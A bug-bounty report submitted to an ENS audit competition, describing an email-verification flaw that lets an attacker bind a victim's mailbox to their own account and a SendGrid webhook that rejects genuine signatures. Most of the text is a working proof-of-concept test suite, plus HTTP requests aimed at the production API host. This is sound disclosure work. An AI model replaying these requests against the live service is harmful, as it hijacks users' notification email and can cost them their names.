# 91813 w a low email verification never identifies the requesting wallet so an attacker binds a victim s mailbox to their own account

**Submitted on Sep 4th 2026 at 14:00:44 UTC by @gzeon for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91813
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Changing sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Email

## Description

## Brief/Intro

`POST /notifications/channels/email` records the authenticated caller as the owner of any address they submit. The confirmation route that follows resolves the emailed token and marks that row verified without ever comparing the confirming party to the account the row belongs to, and neither the mail nor the confirmation page names that account. An attacker submits an address they do not control, ENS mails the real owner a genuine verification link, and one click binds that mailbox to the attacker's account. Address exclusivity then refuses the mailbox owner when they enter their own address, and every route out of that state is owner-scoped or unreachable.

## Vulnerability Details

Adding a channel is authenticated, and the caller's JWT `user_id` becomes the row's owner. The route accepts any syntactically valid address and defers mailbox control to the confirmation step (`workers/api-worker/src/app/routes/notifications/channels/email.ts:29-101`):

```ts
.post('/', ...requireAuth, injectDb, vValidator('json', addEmailChannelBodySchema), async (c) => {
  const userId = c.var.user_id
  const { email: rawEmail } = c.req.valid('json')
  const email = normalizeEmailForRateLimit(rawEmail)
  ...
  const channel = await c.var.db.insert(TABLE.userChannels).values({
    user_id: userId, channel: 'email', status: 'pending', target: email,
  })
```

The route's only limit is three verification sends per hour, keyed on the normalised address rather than on the caller (`services/notifications/email-verification-rate-limit.ts:3-4,25-30`), so it does not constrain a single targeted send and does not record who asked. It is also consumed at `:126`, after the channel row and the verification token are already written (`:75-97`, `:104-120`), so even a rejected send leaves a live pending row and a usable token behind.

Confirmation is a separate route carrying no `requireAuth`, and none is inherited: `requireAuth` is only ever spread into individual handlers, and `grep -rn '\.use(' workers/api-worker/src/app/` returns exactly one line, `app/index.ts:15`, which mounts `cors()`. It resolves the token and writes `verified` onto whichever channel the token references (`email.ts:172-207`):

```ts
.post('/verify', vValidator('json', verifyEmailChannelBodySchema), injectDb, async (c) => {
  const { token } = c.req.valid('json')
  const verification = await c.var.db.query.channelVerifications.findFirst({
    where: and(
      eq(TABLE.channelVerifications.token, token),
      eq(TABLE.channelVerifications.purpose, 'verify'),
      gt(TABLE.channelVerifications.expires_at, new Date()),
    ),
    with: { channel: true },
  })
  ...
  await c.var.db.update(TABLE.userChannels)
    .set({ status: 'verified', verified_at: new Date() })
    .where(eq(TABLE.userChannels.id, verification.channel_id))
```

`verification.user_id` sits on the row and is compared with nothing. An unauthenticated confirmation is correct for a mailbox proof, since the link opens from a mail client with no session. What is missing is attribution. The mail comes from the configured ENS sender, is addressed to the recipient, and reads "Thank you for signing up for ENS notifications! Please verify your email address by clicking the button below" (`services/email/verification.ts:16-79`). The link is a GET to the Manager, whose only affirmative control is a "Verify Email Address" button that posts the token (`apps/manager/src/routes/notifications/channels/email/verify.tsx:217-225`). No account is named at any point, so consuming the link is the only way to learn what it binds.

The same codebase gets this right for its other unverified channel. `POST /notifications/channels/telegram` writes a row only after `verifyTelegramAuth` recomputes Telegram's HMAC over the login payload, so a fresh provider-issued proof for the target exists before any row does, and the row is written straight to `verified` (`channels/telegram.ts:33-46,60-71`). The email route reverses that order: it writes the target first and proves it afterwards, and records nobody in between.

Once verified, the address is refused to everyone else (`email.ts:58-72`):

```ts
const otherUserChannel = await c.var.db.query.userChannels.findFirst({
  where: and(
    eq(TABLE.userChannels.channel, 'email'),
    eq(TABLE.userChannels.target, email),
    eq(TABLE.userChannels.status, 'verified'),
  ),
})
if (otherUserChannel && otherUserChannel.user_id !== userId) {
  return c.json({ error: 'This email address is already linked to another account' }, 400)
}
```

The uniqueness constraint is `(user_id, channel, target)`, not `(channel, target)` (`core/database/schema/notifications.ts:73-78`), so this is a read-then-write check rather than a database invariant and two pending rows for one address can each be verified. It does bound the attack: an address whose owner already enrolled it cannot be taken, because the pre-existing verified row fails the guard. The PoC tests that bound.

**Every route out of the state is closed to the mailbox owner.** `DELETE /notifications/channels/:id` scopes its lookup to the caller's `user_id` and answers 404 to anyone else (`channels/$id.ts:62-79`). The only other transitions off `verified` are SendGrid event processing and DLQ bounce classification, and for a deliverable address neither fires:

* The SendGrid webhook handles `bounce`, `dropped`, `spamreport`, `unsubscribe` and `group_unsubscribe` (`webhook/sendgrid.ts:184-238`), but `processEvents` is never reached, because the handler verifies the wrong encoding (`sendgrid.ts:86-101`):

```ts
// elided: both statements are wrapped in the module's fromSync/fromPromise helpers
const signatureData = Uint8Array.from(atob(signature), (c) => c.charCodeAt(0))
const isValid = await crypto.subtle.verify(
  { name: 'ECDSA', hash: 'SHA-256' },
  verificationKey, signatureData, encoder.encode(signedPayload),
)
```

Twilio's instructions for this header are to "Decode the Base64 encoded signature. Then perform an ASN.1 unmarshal of the decoded signature into a string. This string will be in the form of {r value},{s value}." SendGrid's own Node helper implements that by calling `Signature.fromBase64`, which is `fromDer` in `starkbank-ecdsa`. WebCrypto's ECDSA verify accepts only fixed-width IEEE P1363 `r || s` at 64 bytes; a DER signature is variable, typically 70 to 72. No converter exists in the repository, so every genuine SendGrid event is rejected with 401 at `sendgrid.ts:146-152`. The route's own test cannot catch this: it builds its fixture with `crypto.subtle.sign` (`sendgrid.test.ts:41-59`), the same encoding the handler verifies. This is a different root cause from the disclosed R2-05, which was a fail-open with the key unset; at this commit a missing key returns 500 before any database work (`sendgrid.ts:110-116`). Here verification is configured and running, and rejects what the provider sends.

* The dead-letter handler marks a channel `bounced` (`queues/dlq.ts:186-210`) only when `classifyEmailError` matches `/invalid.*email|email.*invalid/i` or `/does not exist/i` against the persisted delivery error (`services/delivery/classifier.ts:27-33`). A deliverable mailbox produces neither.

Targets are self-published: ENS owners write their address into the `email` text record through the Manager's profile editor, and the profile view renders it (`apps/manager/src/features/profile/data/records/text.tsx:182`).

Neither route has changed since the competition branch was created. `git log` on both files returns only `cda79ac`, and the sole later change under `workers/api-worker/` is a hono version bump.

## Impact Details

**In-scope impact: (Websites & Applications) Changing sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Email. Severity: High.**

The detail changed is the victim's email address, which is the bullet's own worked example: it becomes bound system-wide to an account that is not theirs, and the guard at `email.ts:59-72` then refuses them their own address. No wallet interaction is involved on the victim's side, and the victim's interaction with the application is one click: the emailed link is navigation to the app, and the only action taken in it is the Verify button (`verify.tsx:220-224`, which has no auto-submit on mount).

That action is the application's own email-verification workflow, performed on ENS's own page, in response to a mail ENS itself composed and sent from its configured sender. The attacker never communicates with the victim and never authors or spoofs anything the victim sees; the only message involved is genuine ENS mail through ENS's own pipeline. What the workflow omits is the identity of the account the confirmation binds to.

For a holder of `example.eth` publishing `owner@example.com` in their `email` record who has not yet enrolled it:

1. The attacker reads the record from the public profile and posts it to `/notifications/channels/email` under a throwaway wallet that completed SIWE.
2. ENS mails `owner@example.com` a genuine verification link naming no account. The holder published that address in their own ENS profile, so mail from ENS about it is the expected consequence of using the service.
3. The holder clicks Verify. `owner@example.com` becomes a verified channel on the attacker's account.
4. The holder enters their own address in notification settings and is told it belongs to another account.
5. Marking the mail as spam or unsubscribing changes nothing, because the webhook rejects the encoding SendGrid sends. Deleting returns 404. Releasing the address requires the attacker or an ENS operator.

The holder's mailbox is now a verified delivery target on an account they do not control, and notifications are dispatched to the owning account's verified channels (`services/notifications/create.ts:115-121`), so ENS begins delivering a stranger's name notifications to it. The holder cannot stop that: the delete route is owner-scoped and unsubscribing does not work.

They are also left unable to enrol the address they published, which is where ENS's four expiry stages, `30d`, `7d`, `1d` and `expired`, would otherwise reach them (`services/expiry-discovery/stages.ts:9-30`). A name whose expiry reminders were never deliverable is lost at the end of the grace period.

The attacker ends holding a verified channel pointed at a mailbox they do not own, and that binding survives every mechanism available to the mailbox owner.

## References

* `workers/api-worker/src/app/routes/notifications/channels/email.ts:29-101` (add: owner is the caller, mailbox control deferred)
* `workers/api-worker/src/app/routes/notifications/channels/email.ts:172-207` (verify: no `requireAuth`, no owner comparison)
* `workers/api-worker/src/app/routes/notifications/channels/email.ts:58-72` (exclusivity guard) with `workers/api-worker/src/core/database/schema/notifications.ts:73-78` (unique on `(user_id, channel, target)`)
* `workers/api-worker/src/app/routes/notifications/channels/$id.ts:62-79` (delete is owner-scoped)
* `workers/api-worker/src/app/routes/notifications/channels/telegram.ts:33-46,60-71` (the same codebase proving control before writing the row)
* `workers/api-worker/src/services/email/verification.ts:16-79` (the mail, which names no account) and `apps/manager/src/routes/notifications/channels/email/verify.tsx:217-225` (the confirm button)
* `workers/api-worker/src/app/routes/webhook/sendgrid.ts:86-101` (DER verified as raw `r || s`), `:110-116` (fails closed with no key, so R2-05 is fixed), `:146-152` (the 401), `:184-238` (`processEvents`, never reached), and `sendgrid.test.ts:41-59` (the test signs with WebCrypto, so it cannot catch it)
* `workers/api-worker/src/services/notifications/create.ts:115-121` (deliveries go to the owning account's verified channels, so the victim's mailbox receives the attacker's notifications)
* `workers/api-worker/src/queues/dlq.ts:186-210` with `workers/api-worker/src/services/delivery/classifier.ts:27-33` (the other path out of `verified`)
* Twilio, Verifying the Event Webhook signature: <https://www.twilio.com/docs/sendgrid/for-developers/tracking-events/getting-started-event-webhook-security-features>

Fix: require an authenticated session on `/verify` and confirm `c.var.user_id === verification.user_id` before writing `verified`. Name the requesting wallet in the mail and on the verify page. Give the mailbox owner a reclaim path. Separately, convert the DER signature to raw `r || s` before `crypto.subtle.verify`.

## Proof of Concept

## Proof of Concept

Every route exercised is the shipped one, unmodified: SIWE login, the email add and verify routes, the channel delete route, and the SendGrid webhook. The shipped `injectDb`/`getDatabase` reach a real Postgres over the Neon HTTP protocol through the local proxy `core/database/index.ts:9-15` already supports. Neither session is hand-minted; both accounts authenticate through `POST /auth/nonce` and `POST /auth/login`, so the attacker needs only a throwaway keypair.

Everything else is loopback, as the prohibition on testing third-party systems requires: both SendGrid mail-send requests are intercepted so no provider is contacted, KV is an in-memory Map, the test database defines the `uuid_generate_v7()` Neon supplies in production, and `SEPOLIA_RPC_URL` points at a local anvil. The captured mail bodies are the application's own. Instrumenting `globalThis.fetch` to record every host the run touches returns exactly `127.0.0.1:8547` and `db.localtest.me:4444`. No third-party system is contacted and no live user is mailed.

Verified at `1c9b47f18fcddd2e864dfe385c4171061c9811ae` on branch `audit-comp-ready`. Prerequisites: Docker, Node 22+, pnpm 10, and Foundry for `anvil`.

### 1. Repository

```bash
git clone https://github.com/immunefi-team/audit-comp-ens && cd audit-comp-ens
git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
pnpm install --frozen-lockfile
```

All later commands run from the repository root unless stated. Ports 4444, 8547 and 55432 must be free.

### 2. Local chain, for SIWE verification only

```bash
anvil --chain-id 11155111 --port 8547 --silent &
until cast block-number --rpc-url http://127.0.0.1:8547 >/dev/null 2>&1; do sleep 1; done
```

### 3. Postgres, with the repository's own migrations

```bash
docker run -d --name ens-poc-pg -e POSTGRES_PASSWORD=poc -e POSTGRES_USER=poc \
  -e POSTGRES_DB=poc -p 55432:5432 postgres:16-alpine

# The postgres image runs a temporary server during init, so poll with a real
# query rather than pg_isready, which returns ready against that temporary one.
until docker exec ens-poc-pg psql -U poc -d poc -c 'select 1' >/dev/null 2>&1; do sleep 1; done
sleep 2

# uuid_generate_v7() is supplied by Neon in production; define an equivalent here.
docker exec -i ens-poc-pg psql -q -v ON_ERROR_STOP=1 -U poc -d poc <<'SQL'
CREATE OR REPLACE FUNCTION uuid_generate_v7() RETURNS uuid AS $func$
  SELECT encode(set_bit(set_bit(overlay(uuid_send(gen_random_uuid())
    placing substring(int8send((extract(epoch from clock_timestamp())*1000)::bigint) from 3)
    from 1 for 6), 52, 1), 53, 1), 'hex')::uuid;
$func$ LANGUAGE sql VOLATILE;
SQL

# Apply the repository's migrations, minus the Neon-only extension line.
for f in workers/api-worker/drizzle/0*.sql; do
  sed -e 's/--> statement-breakpoint//' -e '/CREATE EXTENSION/d' -e '/pg_uuidv7/d' "$f" \
    | docker exec -i ens-poc-pg psql -q -v ON_ERROR_STOP=1 -U poc -d poc
done
```

Ten tables should exist: `docker exec ens-poc-pg psql -tAU poc -d poc -c "select count(*) from information_schema.tables where table_schema='public'"`.

### 4. The Neon HTTP proxy the worker already supports

`core/database/index.ts:9-15` rewrites the fetch endpoint for the host `db.localtest.me` to `http://db.localtest.me:4444/sql`, citing this proxy by name. Running it lets the shipped `getDatabase` reach Postgres unchanged.

```bash
docker run -d --name ens-poc-neon --network host \
  -e PG_CONNECTION_STRING='postgres://poc:poc@127.0.0.1:55432/poc' \
  ghcr.io/timowilhelm/local-neon-http-proxy:main
```

### 5. Create `workers/api-worker/vitest.poc.config.ts`

```ts
import { defineConfig } from 'vitest/config'

export default defineConfig({
  test: {
    environment: 'node',
    include: ['src/**/*.poc.test.ts'],
    testTimeout: 30_000,
  },
})
```

### 6. Create `workers/api-worker/src/app/routes/notifications/channels/email.poc.test.ts`

```ts
/**
 * ENS api-worker — email channel binding.
 *
 * Every route handler exercised here is the shipped one, unmodified: the SIWE
 * login, the email-channel add and verify routes, the channel delete route, and
 * the SendGrid webhook. The shipped `injectDb`/`getDatabase` reach a real
 * Postgres over the Neon HTTP protocol through the local proxy that
 * `core/database/index.ts:9-15` already supports.
 *
 * Harness substitutions, stated plainly:
 *   - Both SendGrid mail-send requests are intercepted so no provider is
 *     contacted; the program prohibits testing against third-party systems. The
 *     captured bodies are the application's own, unmodified.
 *   - KV is an in-memory Map; the worker uses it for the SIWE nonce store and
 *     the verification-send rate limit.
 *   - The test database defines `uuid_generate_v7()`, which Neon supplies in
 *     production.
 *   - `SEPOLIA_RPC_URL` points at a local anvil so SIWE verification does no
 *     external I/O.
 * Sessions are not hand-minted: both accounts authenticate through the real
 * `POST /auth/nonce` + `POST /auth/login` SIWE flow, so the attacker's only
 * requirement is a throwaway keypair.
 */
import { Client } from 'pg'
import { createSign, generateKeyPairSync, webcrypto } from 'node:crypto'
import { privateKeyToAccount } from 'viem/accounts'
import { createSiweMessage } from 'viem/siwe'
import { afterAll, beforeAll, expect, it } from 'vitest'

const PG = process.env.POC_PG ?? 'postgres://poc:poc@127.0.0.1:55432/poc'
const JWT_SECRET = 'poc-secret'
const VICTIM_EMAIL = 'victim@example.invalid'

const sentMail: Array<Record<string, any>> = []
const realFetch = globalThis.fetch
globalThis.fetch = (async (input: any, init: any) => {
  const url = String(input instanceof Request ? input.url : input)
  if (url.startsWith('https://api.sendgrid.com/')) {
    sentMail.push(JSON.parse(init.body))
    return new Response(null, { status: 202 })
  }
  return realFetch(input, init)
}) as typeof fetch

const { default: emailApp } = await import('./email.js')
const { default: channelApp } = await import('./$id.js')
const { default: authApp } = await import('#app/routes/auth/index.js')
const { default: webhookApp } = await import('#app/routes/webhook/index.js')

// A P-256 keypair standing in for SendGrid's. The public half is what the
// worker is configured with; the private half signs the events below.
const sgKeys = generateKeyPairSync('ec', { namedCurve: 'prime256v1' })
const SG_PUBLIC_B64 = sgKeys.publicKey.export({ type: 'spki', format: 'der' }).toString('base64')

const kv = new Map<string, string>()
const env = {
  JWT_SECRET,
  SENDGRID_API_KEY: 'poc-not-a-real-key',
  EMAIL_FROM_ADDRESS: 'noreply@ens.invalid',
  MANAGER_APP_URL: 'https://manager.invalid',
  // The hostname core/database/index.ts:9-15 rewrites to the local Neon HTTP
  // proxy, so the shipped getDatabase() runs as-is.
  DATABASE_URL: 'postgres://poc:poc@db.localtest.me/poc',
  CHAIN: 'sepolia',
  SEPOLIA_RPC_URL: process.env.POC_RPC ?? 'http://127.0.0.1:8547',
  SENDGRID_WEBHOOK_VERIFICATION_KEY: SG_PUBLIC_B64,
  KV: {
    get: async (k: string) => kv.get(k) ?? null,
    put: async (k: string, v: string) => void kv.set(k, v),
    delete: async (k: string) => void kv.delete(k),
  },
}

const pg = new Client({ connectionString: PG })
const channelRow = async (target: string) =>
  (await pg.query('select id, user_id, status from user_channels where target=$1', [target])).rows[0]
/** Logs a throwaway keypair in through the worker's real SIWE routes. */
const siweLogin = async (privateKey: `0x${string}`) => {
  const account = privateKeyToAccount(privateKey)
  const nonceRes = await authApp.request('/auth/nonce', { method: 'POST' }, env)
  const { nonce } = (await nonceRes.json()) as { nonce: string }
  const message = createSiweMessage({
    address: account.address,
    chainId: 11155111,
    domain: 'app.ens.domains',
    nonce,
    uri: 'https://app.ens.domains',
    version: '1',
  })
  const signature = await account.signMessage({ message })
  const res = await authApp.request(
    '/auth/login',
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address: account.address, message, signature, nonce }),
    },
    env,
  )
  const body = (await res.json()) as { token?: string; error?: string }
  if (!body.token) throw new Error(`SIWE login failed: ${res.status} ${JSON.stringify(body)}`)
  return { token: body.token, address: account.address }
}

const req = (app: any, path: string, o: { method?: string; jwt?: string; body?: unknown } = {}) =>
  app.request(
    path,
    {
      method: o.method ?? 'POST',
      headers: { 'Content-Type': 'application/json', ...(o.jwt ? { Authorization: `Bearer ${o.jwt}` } : {}) },
      ...(o.body ? { body: JSON.stringify(o.body) } : {}),
    },
    env,
  )

const ATTACKER_KEY = '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d' as const
const VICTIM_KEY = '0x8b3a350cf5c34c9194ca85829a2df0ec3153be0318b5e2d3348e872092edffba' as const
const THIRD_KEY = '0x92db14e403b83dfe3df233f83dfa3a0d7096f21ca9b0d6d6b8d88b2b4ec1564e' as const

let attackerJwt: string
let victimJwt: string
let attackerAddr: string

const userIdFor = async (addr: string) =>
  (await pg.query('select id from users where lower(address)=lower($1)', [addr])).rows[0].id

beforeAll(async () => {
  await pg.connect()
  await pg.query('delete from channel_verifications')
  await pg.query('delete from user_channels')
  await pg.query('delete from users')
  // Both accounts obtain their session through the worker's real SIWE routes.
  const a = await siweLogin(ATTACKER_KEY)
  const v = await siweLogin(VICTIM_KEY)
  attackerJwt = a.token
  attackerAddr = a.address
  victimJwt = v.token
})
afterAll(async () => {
  await pg.end()
})

it('binds a victim mailbox to the attacker account, with no self-service way back', async () => {
  console.log('\nStep 0 — adding a channel requires authentication; confirmation relies only on the emailed token')
  const unauth = await req(emailApp, '/email', { body: { email: VICTIM_EMAIL } })
  console.log(`  unauthenticated add -> HTTP ${unauth.status}`)
  expect(unauth.status).toBe(401)

  console.log("\nStep 1 — the attacker registers the victim's address on the attacker's own account")
  const attackerId = await userIdFor(attackerAddr)
  const add = await req(emailApp, '/email', { jwt: attackerJwt, body: { email: VICTIM_EMAIL } })
  const row0 = await channelRow(VICTIM_EMAIL)
  console.log(`  attacker add -> HTTP ${add.status}; row owner=${row0.user_id === attackerId ? 'attacker' : row0.user_id} status=${row0.status}`)
  expect(add.status).toBe(200)
  expect(row0.user_id).toBe(attackerId)
  expect(row0.status).toBe('pending')

  console.log('\nStep 2 — ENS mails the victim a genuine verification link')
  const mail = sentMail.at(-1)!
  const body = mail.content[0].value as string
  const token = /token=([0-9a-f]{32})/.exec(body)![1]
  console.log(`  to=${mail.personalizations[0].to[0].email}  subject=${mail.subject}`)
  console.log(`  link names no account: ${!body.includes(attackerId)}`)
  expect(mail.personalizations[0].to[0].email).toBe(VICTIM_EMAIL)
  expect(body.includes(attackerId)).toBe(false)

  console.log('\nStep 3 — the victim opens it. /verify takes no Authorization header')
  const verify = await req(emailApp, '/email/verify', { body: { token } })
  const row1 = await channelRow(VICTIM_EMAIL)
  console.log(`  unauthenticated verify -> HTTP ${verify.status}; row owner=${row1.user_id === attackerId ? 'attacker' : 'victim'} status=${row1.status}`)
  expect(verify.status).toBe(200)
  expect(row1.status).toBe('verified')
  expect(row1.user_id).toBe(attackerId)

  console.log('\nStep 4 — the victim can no longer register their own address')
  const victimAdd = await req(emailApp, '/email', { jwt: victimJwt, body: { email: VICTIM_EMAIL } })
  const victimBody = await victimAdd.json()
  console.log(`  victim add -> HTTP ${victimAdd.status} ${JSON.stringify(victimBody)}`)
  expect(victimAdd.status).toBe(400)
  expect(victimBody).toEqual({ error: 'This email address is already linked to another account' })

  console.log('\nStep 5 — the victim cannot delete the row either')
  const del = await req(channelApp, `/${row1.id}`, { method: 'DELETE', jwt: victimJwt })
  const row2 = await channelRow(VICTIM_EMAIL)
  console.log(`  victim delete -> HTTP ${del.status}; row still owner=${row2.user_id === attackerId ? 'attacker' : 'victim'} status=${row2.status}`)
  expect(del.status).toBe(404)
  expect(row2.status).toBe('verified')
  expect(row2.user_id).toBe(attackerId)
})

it('cannot take an address its owner verified first', async () => {
  await pg.query('delete from channel_verifications')
  await pg.query('delete from user_channels')
  const ENROLLED = 'enrolled@example.invalid'
  const { token: jwt } = await siweLogin(THIRD_KEY)

  await req(emailApp, '/email', { jwt, body: { email: ENROLLED } })
  const token = /token=([0-9a-f]{32})/.exec(sentMail.at(-1)!.content[0].value)![1]
  await req(emailApp, '/email/verify', { body: { token } })

  const take = await req(emailApp, '/email', { jwt: attackerJwt, body: { email: ENROLLED } })
  console.log(`\nScope bound — attacker taking an already-verified address -> HTTP ${take.status}`)
  expect(take.status).toBe(400)
})

it('the webhook rejects the encoding SendGrid sends, so unsubscribing cannot free the address', async () => {
  // Re-establish the binding from the first test.
  await pg.query('delete from channel_verifications')
  await pg.query('delete from user_channels')
  await req(emailApp, '/email', { jwt: attackerJwt, body: { email: VICTIM_EMAIL } })
  const tok = /token=([0-9a-f]{32})/.exec(sentMail.at(-1)!.content[0].value)![1]
  await req(emailApp, '/email/verify', { body: { token: tok } })
  expect((await channelRow(VICTIM_EMAIL)).status).toBe('verified')

  const timestamp = String(Math.floor(Date.now() / 1000))
  const events = JSON.stringify([
    { email: VICTIM_EMAIL, event: 'unsubscribe', timestamp: Number(timestamp) },
  ])
  const signed = timestamp + events

  const post = (signature: string) =>
    webhookApp.request(
      '/webhook/sendgrid/events',
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Twilio-Email-Event-Webhook-Signature': signature,
          'X-Twilio-Email-Event-Webhook-Timestamp': timestamp,
        },
        body: events,
      },
      env,
    )

  // What SendGrid sends: a standard ECDSA signature, ASN.1 DER, base64.
  const der = createSign('sha256').update(signed).sign(sgKeys.privateKey, 'base64')
  const derRes = await post(der)
  const afterDer = await channelRow(VICTIM_EMAIL)
  console.log(`\nUnsubscribe signed the way SendGrid signs it (DER, ${Buffer.from(der, 'base64').length} bytes)`)
  console.log(`  POST /webhook/sendgrid/events -> HTTP ${derRes.status} ${JSON.stringify(await derRes.json())}`)
  console.log(`  channel status afterwards -> ${afterDer.status}`)
  expect(derRes.status).toBe(401)
  expect(afterDer.status).toBe('verified')

  // The same key and message in the fixed-width r||s form WebCrypto wants.
  const pk = await webcrypto.subtle.importKey(
    'pkcs8',
    sgKeys.privateKey.export({ type: 'pkcs8', format: 'der' }),
    { name: 'ECDSA', namedCurve: 'P-256' },
    false,
    ['sign'],
  )
  const rawSig = Buffer.from(
    await webcrypto.subtle.sign({ name: 'ECDSA', hash: 'SHA-256' }, pk, new TextEncoder().encode(signed)),
  )
  const rawRes = await post(rawSig.toString('base64'))
  const afterRaw = await channelRow(VICTIM_EMAIL)
  console.log(`\nThe same event in the encoding the handler expects (raw r||s, ${rawSig.length} bytes)`)
  console.log(`  POST /webhook/sendgrid/events -> HTTP ${rawRes.status}`)
  console.log(`  channel status afterwards -> ${afterRaw.status}`)
  expect(rawRes.status).toBe(200)
  expect(afterRaw.status).toBe('unsubscribed')
})
```

### 7. Run

The worker's own JSON log lines are omitted below for readability; every `Step`/`->` line is the PoC's own `console.log` output.

```
$ cd workers/api-worker && pnpm exec vitest run --config vitest.poc.config.ts --reporter=verbose \
    src/app/routes/notifications/channels/email.poc.test.ts

Step 0 - adding a channel requires authentication; confirmation relies only on the emailed token
  unauthenticated add -> HTTP 401
Step 1 - the attacker registers the victim's address on the attacker's own account
  attacker add -> HTTP 200; row owner=attacker status=pending
Step 2 - ENS mails the victim a genuine verification link
  to=victim@example.invalid  subject=Verify your email address - ENS Notifications
  link names no account: true
Step 3 - the victim opens it. /verify takes no Authorization header
  unauthenticated verify -> HTTP 200; row owner=attacker status=verified
Step 4 - the victim can no longer register their own address
  victim add -> HTTP 400 {"error":"This email address is already linked to another account"}
Step 5 - the victim cannot delete the row either
  victim delete -> HTTP 404; row still owner=attacker status=verified
 ✓ binds a victim mailbox to the attacker account, with no self-service way back

Scope bound - attacker taking an already-verified address -> HTTP 400
 ✓ cannot take an address its owner verified first

Unsubscribe signed the way SendGrid signs it (DER, 72 bytes)
  POST /webhook/sendgrid/events -> HTTP 401 {"error":"Invalid signature"}
  channel status afterwards -> verified
The same event in the encoding the handler expects (raw r||s, 64 bytes)
  POST /webhook/sendgrid/events -> HTTP 200
  channel status afterwards -> unsubscribed
 ✓ the webhook rejects the encoding SendGrid sends, so unsubscribing cannot free the address

 Test Files  1 passed (1)
      Tests  3 passed (3)
```

In the third case, same key and same payload, a DER signature in SendGrid's documented format returns 401 and leaves the row `verified`, while a P1363 signature for the same payload returns 200 and marks it `unsubscribed`. DER is variable length, so the byte count printed there moves between 70 and 72 across runs; the P1363 figure is always 64. This is the unmodified route handler under Node, not a deployed Worker.

### 8. Cleanup

```bash
docker rm -f ens-poc-pg ens-poc-neon
pkill -x anvil
rm workers/api-worker/vitest.poc.config.ts \
   workers/api-worker/src/app/routes/notifications/channels/email.poc.test.ts
```

### Equivalent HTTP requests

```http
POST /notifications/channels/email HTTP/1.1
Host: app-api.ens.dev
Authorization: Bearer <attacker JWT from POST /auth/login>
Content-Type: application/json

{"email":"owner@example.com"}
```

```http
POST /notifications/channels/email/verify HTTP/1.1
Host: app-api.ens.dev
Content-Type: application/json

{"token":"<32 hex chars from the link in the mail ENS sent>"}
```
